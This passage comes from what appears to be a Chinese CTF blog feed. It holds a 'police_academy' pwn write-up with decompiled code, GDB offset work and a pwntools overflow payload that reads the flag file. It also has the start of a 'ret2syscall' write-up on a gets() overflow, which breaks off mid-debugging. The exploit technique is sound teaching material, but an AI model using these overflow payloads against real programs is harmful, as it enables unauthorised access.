      v9 <span class="token operator">=</span> <span class="token string">'f08d4b8b'</span><span class="token punctuation">;</span>
      v10 <span class="token operator">=</span> <span class="token string">'ad116607'</span><span class="token punctuation">;</span>
      v11 <span class="token operator">=</span> <span class="token string">'06491899'</span><span class="token punctuation">;</span>
      v12 <span class="token operator">=</span> <span class="token string">'tad.'</span><span class="token punctuation">;</span>
      v13 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
      <span class="token keyword">break</span><span class="token punctuation">;</span>
    <span class="token keyword">case</span> <span class="token number">5</span><span class="token punctuation">:</span>
      v8 <span class="token operator">=</span> <span class="token string">'cb7eb354'</span><span class="token punctuation">;</span>
      v9 <span class="token operator">=</span> <span class="token string">'c09d32f0'</span><span class="token punctuation">;</span>
      v10 <span class="token operator">=</span> <span class="token string">'b5dc33e0'</span><span class="token punctuation">;</span>
      v3 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token string">'0c283015'</span><span class="token punctuation">;</span>
      v11 <span class="token operator">=</span> <span class="token string">'0c283015'</span><span class="token punctuation">;</span>
      v12 <span class="token operator">=</span> <span class="token string">'tad.'</span><span class="token punctuation">;</span>
      v13 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
      <span class="token keyword">break</span><span class="token punctuation">;</span>
    <span class="token keyword">case</span> <span class="token number">6</span><span class="token punctuation">:</span>
      v8 <span class="token operator">=</span> <span class="token string">'6cfe3313'</span><span class="token punctuation">;</span>
      v9 <span class="token operator">=</span> <span class="token string">'b5d57a29'</span><span class="token punctuation">;</span>
      v3 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token string">'a7e6a65d'</span><span class="token punctuation">;</span>
      v10 <span class="token operator">=</span> <span class="token string">'a7e6a65d'</span><span class="token punctuation">;</span>
      v11 <span class="token operator">=</span> <span class="token string">'c721627f'</span><span class="token punctuation">;</span>
      v12 <span class="token operator">=</span> <span class="token string">'tad.'</span><span class="token punctuation">;</span>
      v13 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
      <span class="token keyword">break</span><span class="token punctuation">;</span>
    <span class="token keyword">case</span> <span class="token number">7</span><span class="token punctuation">:</span>
      v8 <span class="token operator">=</span> <span class="token string">'txt.galf'</span><span class="token punctuation">;</span>
      <span class="token function">LOBYTE</span><span class="token punctuation">(</span>v9<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
      <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"You don't have the required privileges to view the flag, yet."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">return</span> result<span class="token punctuation">;</span>
    <span class="token keyword">default</span><span class="token punctuation">:</span>
      <span class="token keyword">break</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  v6 <span class="token operator">=</span> <span class="token function">print_record</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v8<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> v6 <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token punctuation">)</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nNo such record exists. Please verify your choice."</span><span class="token punctuation">,</span> v3<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">fflush</span><span class="token punctuation">(</span>_bss_start<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>首先程序需要输入密码 这里可以看到密码为 kaiokenx20</p>
<p>程序需要输入1-7 之后进行print_record（）函数操作 跟进看一下</p>
<p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">signed</span> __int64 __fastcall <span class="token function">print_record</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>a1<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  FILE <span class="token operator">*</span>stream<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+18h] [rbp-338h]</span>
  <span class="token keyword">char</span> ptr<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+20h] [rbp-330h]</span>
  <span class="token keyword">unsigned</span> __int64 v4<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+348h] [rbp-8h]</span>

  v4 <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token function">strlen</span><span class="token punctuation">(</span>a1<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">36</span> <span class="token punctuation">)</span>
    <span class="token keyword">return</span> <span class="token number">0xFFFFFFFFLL</span><span class="token punctuation">;</span>
  stream <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span>a1<span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>stream <span class="token punctuation">)</span>
    <span class="token keyword">return</span> <span class="token number">0xFFFFFFFFLL</span><span class="token punctuation">;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"\nXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">fread</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>ptr<span class="token punctuation">,</span> <span class="token number">0x30CuLL</span><span class="token punctuation">,</span> <span class="token number">1uLL</span><span class="token punctuation">,</span> stream<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>ptr<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n\nXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">fclose</span><span class="token punctuation">(</span>stream<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>判断了 读入的长度是否为36 是的话就行读取 </p>
<h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>可以利用</p>
<p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-c"><code class="language-c"><span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>s1<span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre>
<p>进行溢出覆盖</p>
<p>使用GDB来判断S1与v8之间的偏移</p>
<p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-c"><code class="language-c"><span class="token punctuation">.</span>text<span class="token punctuation">:</span>0000000000400B1E loc_400B1E<span class="token punctuation">:</span>                             <span class="token punctuation">;</span> CODE XREF<span class="token punctuation">:</span> main<span class="token operator">+</span><span class="token number">136</span>↑j
<span class="token punctuation">.</span>text<span class="token punctuation">:</span>0000000000400B1E                                         <span class="token punctuation">;</span> DATA XREF<span class="token punctuation">:</span> <span class="token punctuation">.</span>rodata<span class="token punctuation">:</span>off_401028↓o
<span class="token punctuation">.</span>text<span class="token punctuation">:</span>0000000000400B1E                 lea     rax<span class="token punctuation">,</span> <span class="token punctuation">[</span>rbp<span class="token operator">+</span>var_30<span class="token punctuation">]</span> <span class="token punctuation">;</span> jumptable 0000000000400AD1 <span class="token keyword">case</span> <span class="token number">2</span>
<span class="token punctuation">.</span>text<span class="token punctuation">:</span>0000000000400B22                 mov     rsi<span class="token punctuation">,</span> <span class="token string">'c1eda58c'</span>
<span class="token punctuation">.</span>text<span class="token punctuation">:</span>0000000000400B2C                 mov     <span class="token punctuation">[</span>rax<span class="token punctuation">]</span><span class="token punctuation">,</span> rsi
<span class="token punctuation">.</span>text<span class="token punctuation">:</span>0000000000400B2F                 mov     rcx<span class="token punctuation">,</span> <span class="token string">'2ebbcb74'</span>
<span class="token punctuation">.</span>text<span class="token punctuation">:</span>0000000000400B39                 mov     <span class="token punctuation">[</span>rax<span class="token operator">+</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">,</span> rcx
<span class="token punctuation">.</span>text<span class="token punctuation">:</span>0000000000400B3D                 mov     rdx<span class="token punctuation">,</span> <span class="token string">'941246ca'</span>
<span class="token punctuation">.</span>text<span class="token punctuation">:</span>0000000000400B47                 mov     <span class="token punctuation">[</span>rax<span class="token operator">+</span>10h<span class="token punctuation">]</span><span class="token punctuation">,</span> rdx
<span class="token punctuation">.</span>text<span class="token punctuation">:</span>0000000000400B4B                 mov     rsi<span class="token punctuation">,</span> <span class="token string">'81b19491'</span>
<span class="token punctuation">.</span>text<span class="token punctuation">:</span>0000000000400B55                 mov     <span class="token punctuation">[</span>rax<span class="token operator">+</span>18h<span class="token punctuation">]</span><span class="token punctuation">,</span> rsi
<span class="token punctuation">.</span>text<span class="token punctuation">:</span>0000000000400B59                 mov     dword ptr <span class="token punctuation">[</span>rax<span class="token operator">+</span>20h<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">'tad.'</span>
<span class="token punctuation">.</span>text<span class="token punctuation">:</span>0000000000400B60                 mov     byte ptr <span class="token punctuation">[</span>rax<span class="token operator">+</span>24h<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">0</span>
<span class="token punctuation">.</span>text<span class="token punctuation">:</span>0000000000400B64                 jmp     loc_400CB8      <span class="token punctuation">;</span> jumptable 0000000000400AD1 <span class="token keyword">default</span> <span class="token keyword">case</span>
</code></pre>
<p>下断在case 2 的 0x400B2F  处</p>
<p></p><p class="code-caption" data-lang="bash" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-bash"><code class="language-bash"><span class="token punctuation">[</span> Legend: Modified register <span class="token operator">|</span> Code <span class="token operator">|</span> Heap <span class="token operator">|</span> Stack <span class="token operator">|</span> String <span class="token punctuation">]</span>
───────────────────────────────────────────────────────────────<span class="token punctuation">[</span> registers <span class="token punctuation">]</span>────
<span class="token variable">$rax</span>   <span class="token keyword">:</span> 0x00007fffffffde70  →  <span class="token string">"c85ade1c"</span>
<span class="token variable">$rbx</span>   <span class="token keyword">:</span> 0x0000000000000000
<span class="token variable">$rcx</span>   <span class="token keyword">:</span> 0x0000000000000010
<span class="token variable">$rdx</span>   <span class="token keyword">:</span> 0x00007ffff7dd3790  →  0x0000000000000000
<span class="token variable">$rsp</span>   <span class="token keyword">:</span> 0x00007fffffffde50  →  0x0000000000000000
<span class="token variable">$rbp</span>   <span class="token keyword">:</span> 0x00007fffffffdea0  →  0x0000000000400d10  →  <span class="token operator">&lt;</span>__libc_csu_init+0<span class="token operator">></span> push r15
<span class="token variable">$rsi</span>   <span class="token keyword">:</span> 0x6331656461353863 <span class="token punctuation">(</span><span class="token string">"c85ade1c"</span>?<span class="token punctuation">)</span>
<span class="token variable">$rdi</span>   <span class="token keyword">:</span> 0x00007fffffffd930  →  0x0000000000190032 <span class="token punctuation">(</span><span class="token string">"2"</span>?<span class="token punctuation">)</span>
<span class="token variable">$rip</span>   <span class="token keyword">:</span> 0x0000000000400b2f  →  <span class="token operator">&lt;</span>main+404<span class="token operator">></span> movabs rcx, 0x3265626263623734
<span class="token variable">$r8</span>    <span class="token keyword">:</span> 0x0000000000000000
<span class="token variable">$r9</span>    <span class="token keyword">:</span> 0x0000000000000000
<span class="token variable">$r10</span>   <span class="token keyword">:</span> 0x0000000000000000
<span class="token variable">$r11</span>   <span class="token keyword">:</span> 0x00007ffff7b845e0  →  0x0002000200020002
<span class="token variable">$r12</span>   <span class="token keyword">:</span> 0x0000000000400790  →  <span class="token operator">&lt;</span>_start+0<span class="token operator">></span> xor ebp, ebp
<span class="token variable">$r13</span>   <span class="token keyword">:</span> 0x00007fffffffdf80  →  0x0000000000000001
<span class="token variable">$r14</span>   <span class="token keyword">:</span> 0x0000000000000000
<span class="token variable">$r15</span>   <span class="token keyword">:</span> 0x0000000000000000
<span class="token variable">$eflags</span><span class="token keyword">:</span> <span class="token punctuation">[</span>CARRY parity ADJUST zero SIGN <span class="token function">trap</span> INTERRUPT direction overflow resume virtualx86 identification<span class="token punctuation">]</span>
<span class="token variable">$es</span><span class="token keyword">:</span> 0x0000  <span class="token variable">$ss</span><span class="token keyword">:</span> 0x002b  <span class="token variable">$fs</span><span class="token keyword">:</span> 0x0000  <span class="token variable">$cs</span><span class="token keyword">:</span> 0x0033  <span class="token variable">$gs</span><span class="token keyword">:</span> 0x0000  <span class="token variable">$ds</span><span class="token keyword">:</span> 0x0000  
───────────────────────────────────────────────────────────────────<span class="token punctuation">[</span> stack <span class="token punctuation">]</span>────
0x00007fffffffde50│+0x00: 0x0000000000000000     ← <span class="token variable">$rsp</span>
0x00007fffffffde58│+0x08: 0x0000000000000002
0x00007fffffffde60│+0x10: <span class="token string">"kaiokenx20"</span>
0x00007fffffffde68│+0x18: 0x0000000000003032 <span class="token punctuation">(</span><span class="token string">"20"</span>?<span class="token punctuation">)</span>
0x00007fffffffde70│+0x20: <span class="token string">"c85ade1c"</span>     ← <span class="token variable">$rax</span>
0x00007fffffffde78│+0x28: 0x0000000000000000
0x00007fffffffde80│+0x30: 0x0000000000400d10  →  <span class="token operator">&lt;</span>__libc_csu_init+0<span class="token operator">></span> push r15
0x00007fffffffde88│+0x38: 0x0000000000400790  →  <span class="token operator">&lt;</span>_start+0<span class="token operator">></span> xor ebp, ebp
────────────────────────────────────────────────────────<span class="token punctuation">[</span> code:i386:x86-64 <span class="token punctuation">]</span>────
     0x400b1e <span class="token operator">&lt;</span>main+387<span class="token operator">></span>       lea    rax, <span class="token punctuation">[</span>rbp-0x30<span class="token punctuation">]</span>
     0x400b22 <span class="token operator">&lt;</span>main+391<span class="token operator">></span>       movabs rsi, 0x6331656461353863
     0x400b2c <span class="token operator">&lt;</span>main+401<span class="token operator">></span>       mov    QWORD PTR <span class="token punctuation">[</span>rax<span class="token punctuation">]</span>, rsi
 →   0x400b2f <span class="token operator">&lt;</span>main+404<span class="token operator">></span>       movabs rcx, 0x3265626263623734
     0x400b39 <span class="token operator">&lt;</span>main+414<span class="token operator">></span>       mov    QWORD PTR <span class="token punctuation">[</span>rax+0x8<span class="token punctuation">]</span>, rcx
     0x400b3d <span class="token operator">&lt;</span>main+418<span class="token operator">></span>       movabs rdx, 0x3934313234366361
     0x400b47 <span class="token operator">&lt;</span>main+428<span class="token operator">></span>       mov    QWORD PTR <span class="token punctuation">[</span>rax+0x10<span class="token punctuation">]</span>, rdx
     0x400b4b <span class="token operator">&lt;</span>main+432<span class="token operator">></span>       movabs rsi, 0x3831623139343931
     0x400b55 <span class="token operator">&lt;</span>main+442<span class="token operator">></span>       mov    QWORD PTR <span class="token punctuation">[</span>rax+0x18<span class="token punctuation">]</span>, rsi
─────────────────────────────────────────────────────────────────<span class="token punctuation">[</span> threads <span class="token punctuation">]</span>────
<span class="token punctuation">[</span><span class="token comment" spellcheck="true">#0] Id 1, Name: "police_academy", stopped, reason: BREAKPOINT</span>
───────────────────────────────────────────────────────────────────<span class="token punctuation">[</span> trace <span class="token punctuation">]</span>────
<span class="token punctuation">[</span><span class="token comment" spellcheck="true">#0] 0x400b2f → Name: main()</span>
</code></pre>
<p>可以查看到此时的rsp以及rbp</p>
<p>通过计算得到此时的v8与s1之间的偏移</p>
<p></p><p class="code-caption" data-lang="bash" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-bash"><code class="language-bash">gef➤  p/x 0x00007fffffffde50+0x10
<span class="token variable">$1</span> <span class="token operator">=</span> 0x7fffffffde60
gef➤  p/x 0x00007fffffffde50+0x20
<span class="token variable">$2</span> <span class="token operator">=</span> 0x7fffffffde70
gef➤  p/d 0x7fffffffde70-0x7fffffffde60
<span class="token variable">$3</span> <span class="token operator">=</span> 16
</code></pre>
<p>得到偏移量为16</p>
<p>但是密码占了10位 所以只能从后6位开始进行填充</p>
<p>由于文件名长度需要达到32位 所以构造payload</p>
<p></p><p class="code-caption" data-lang="python" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./police_academy"</span><span class="token punctuation">)</span>
payload <span class="token operator">=</span> <span class="token string">'kaiokenx20'</span> <span class="token operator">+</span> <span class="token string">'\x00'</span><span class="token operator">*</span><span class="token number">6</span><span class="token operator">+</span><span class="token string">'./'</span><span class="token operator">*</span><span class="token number">14</span><span class="token operator">+</span><span class="token string">'flag.txt'</span>
p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Enter password to authentic yourself : '</span><span class="token punctuation">)</span>
p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">)</span>
p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'9'</span><span class="token punctuation">)</span>
p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre>
<p>因为在根目录下面 </p>
<p>所以使用了./进行填充</p>
<p>这里case选择9是为了</p>
<p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">default</span><span class="token punctuation">:</span>
  <span class="token keyword">break</span><span class="token punctuation">;</span>
</code></pre>
<p>跳出循环</p>
<p>本地运行即可获得flag</p>
<p></p><p class="code-caption" data-lang="bash" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-bash"><code class="language-bash">ios@ubuntu:~$ python police_academy.py
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Starting local process <span class="token string">'./police_academy'</span><span class="token keyword">:</span> pid 5065
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Switching to interactive mode


     1<span class="token punctuation">)</span> Application_1
     2<span class="token punctuation">)</span> Application_2
     3<span class="token punctuation">)</span> Application_3
     4<span class="token punctuation">)</span> Application_4
     5<span class="token punctuation">)</span> Application_5
     6<span class="token punctuation">)</span> Application_6
     7<span class="token punctuation">)</span> Flag

     Enter choice <span class="token punctuation">[</span>*<span class="token punctuation">]</span> Process <span class="token string">'./police_academy'</span> stopped with <span class="token keyword">exit</span> code 0 <span class="token punctuation">(</span>pid 5065<span class="token punctuation">)</span>

XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX

flag<span class="token punctuation">{</span>is wo ai ni<span class="token punctuation">}</span>
\x7f��\x7f

XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX

<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Got EOF <span class="token keyword">while</span> reading <span class="token keyword">in</span> interactive
$
</code></pre>
]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;走一下程序流程&quot;&gt;&lt;a href=&quot;#走一下程序流程&quot; class=&quot;headerlink&quot; title=&quot;走一下程序流程&quot;&gt;&lt;/a&gt;走一下程序流程&lt;/h3&gt;&lt;p&gt;&lt;/p&gt;&lt;p class=&quot;code-caption&quot; data-lang=&quot;bash&quot; data-
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>bamboofox-ret2syscall</title>
    <link href="http://iosmosis.github.io/2018/06/18/bamboofox-ret2syscall/"/>
    <id>http://iosmosis.github.io/2018/06/18/bamboofox-ret2syscall/</id>
    <published>2018-06-18T05:51:01.000Z</published>
    <updated>2018-06-18T06:42:58.805Z</updated>
    
    <content type="html"><![CDATA[<p>程序源码</p>
<p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>

<span class="token keyword">char</span> <span class="token operator">*</span>shell <span class="token operator">=</span> <span class="token string">"/bin/sh"</span><span class="token punctuation">;</span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"This time, no system() and NO SHELLCODE!!!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"What do you plan to do?\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">gets</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>检查程序</p>
<p></p><p class="code-caption" data-lang="bash" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-bash"><code class="language-bash">ios@ubuntu:~$ checksec rop
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token string">'/home/ios/rop'</span>
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE <span class="token punctuation">(</span>0x8048000<span class="token punctuation">)</span>
ios@ubuntu:~$
</code></pre>
<p>NX开启</p>
<p>载入IDA分析</p>
<p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  <span class="token keyword">int</span> v4<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+1Ch] [ebp-64h]</span>

  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"This time, no system() and NO SHELLCODE!!!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"What do you plan to do?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">gets</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>v4<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//存在漏洞</span>
  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>由于题目包含了libc所以可以直接使用ropchain getshell</p>
<p>本题有个不理解的点 就是v4的偏移 直接ida的偏移是错的 所以在此记录 正确偏移的分析方法<br><img src="/2018/06/18/bamboofox-ret2syscall/1.jpg" alt="ida1"><br>在gets处下断</p>
<p></p><p class="code-caption" data-lang="bash" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-bash"><code class="language-bash">gdb-peda$ b* 0x8048E96
Breakpoint 2 at 0x8048e96: <span class="token function">file</span> rop.c, line 15.
</code></pre>
<p>尝试运行到gets处</p>
<p></p><p class="code-caption" data-lang="bash" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-bash"><code class="language-bash">gdb-peda$ c
Continuing.
This time, no system<span class="token punctuation">(</span><span class="token punctuation">)</span> and NO SHELLCODE<span class="token operator">!</span><span class="token operator">!</span><span class="token operator">!</span>
What <span class="token keyword">do</span> you plan to do?

<span class="token punctuation">[</span>----------------------------------registers-----------------------------------<span class="token punctuation">]</span>
EAX: 0xffffd04c --<span class="token operator">></span> 0x3 
EBX: 0x80481a8 <span class="token punctuation">(</span><span class="token operator">&lt;</span>_init<span class="token operator">></span>:    push   ebx<span class="token punctuation">)</span>
ECX: 0x80eb4d4 --<span class="token operator">></span> 0x0 
EDX: 0x18 
ESI: 0x0 
EDI: 0x80ea00c --<span class="token operator">></span> 0x8067b10 <span class="token punctuation">(</span><span class="token operator">&lt;</span>__stpcpy_sse2<span class="token operator">></span>:    mov    edx,DWORD PTR <span class="token punctuation">[</span>esp+0x4<span class="token punctuation">]</span><span class="token punctuation">)</span>
EBP: 0xffffd0b8 --<span class="token operator">></span> 0x8049630 <span class="token punctuation">(</span><span class="token operator">&lt;</span>__libc_csu_fini<span class="token operator">></span>:    push   ebx<span class="token punctuation">)</span>
ESP: 0xffffd030 --<span class="token operator">></span> 0xffffd04c --<span class="token operator">></span> 0x3 
